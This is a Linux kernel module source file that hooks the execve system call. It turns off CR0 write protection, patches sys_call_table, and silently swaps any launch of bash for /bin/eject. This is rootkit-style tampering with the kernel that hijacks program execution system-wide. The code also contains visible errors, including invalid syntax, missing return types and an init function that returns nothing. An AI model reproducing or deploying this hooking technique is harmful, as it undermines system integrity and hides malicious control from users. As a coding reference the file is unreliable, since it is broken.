#define _GNU_SOURCE
#include <linux/unistd.h>
#include <linux/string.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/types.h>
#include <stdint.h>
//#include<linux/proc_ns.h>
#include <stdbool.h>

//#include<linux/unistd.h>
//#include<unistd_32.h>
// execve("/usr/bin/bash", ["bash"], 0x7fff23adffb0 /* 42 vars */) = 0

unsigned long cr0, orig_cr0;
// void * force = NULL;
long ret;
// char *cmd[2] = { "eject", (char *)0 };
// char *env[1] = { NULL };

#define unprotect_memory() \
({ \
        write_cr0(read_cr0() & (~ 0x00010000)); \
});

#define protect_memory() \
({ \
        write_cr0(read_cr0() | (0x00010000)); \
});


static inline void write_cr0_forced(unsigned long val)
{
    unsigned long __force_order;

    asm volatile(
            "mov %0, %%cr0"
            : "+r"(val), "+m"(__force_order)
        );
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16 ,0)
    force(unsigned long * ) = (unsigned long *)&write_cr0_forced;
#endif

asmlinkage long (*orig_execve)(const char *pathname, char *const argv[], char *const envp[]);
unsigned long **sys_call_table;

hooking_syscall(void *hook_addr, __uint16_t syscall_offset, unsigned long *sys_call_table)
{
    unprotect_memory();
    sys_call_table[syscall_offset] = (unsigned long) hook_addr;
    protect_memory();
}

unhooking_syscall(void *orig_addr, __uint16_t syscall_offset, unsigned long *sys_call_table)
{
    unprotect_memory();
    sys_call_table[syscall_offset] = (unsigned long) orig_addr;
    protect_memory();
}

asmlinkage long hooked_eject(const char *pathname, char *const argv[], char *const envp[])
{
    int len = strlen(pathname);

    if (strcmp(pathname + len - 4, "bash"))
    {
        return (*orig_execve)(pathname, argv, envp);
    } else {
        int fd;
        char *ej = "/bin/eject\0";

        printk(KERN_ALERT "Hooked!");
        copy_to_user( (void *) pathname, ej, strlen(ej) + 1 );

        fd = (*orig_execve)(pathname, argv, envp);

        return fd;
    }
}

static int __init eject_init(void) {
    sys_call_table = (unsigned long **)kallsyms_lookup_name("sys_call_table");
    orig_execve = (void *)sys_call_table[__NR_execve];
    hooking_syscall(hooked_eject, __NR_execve, sys_call_table);
}

static void __exit eject_cleanup(void)
{
    unhooking_syscall(orig_execve, __NR_execve, sys_call_table);
}

module_init(eject_init);
module_exit(eject_cleanup);
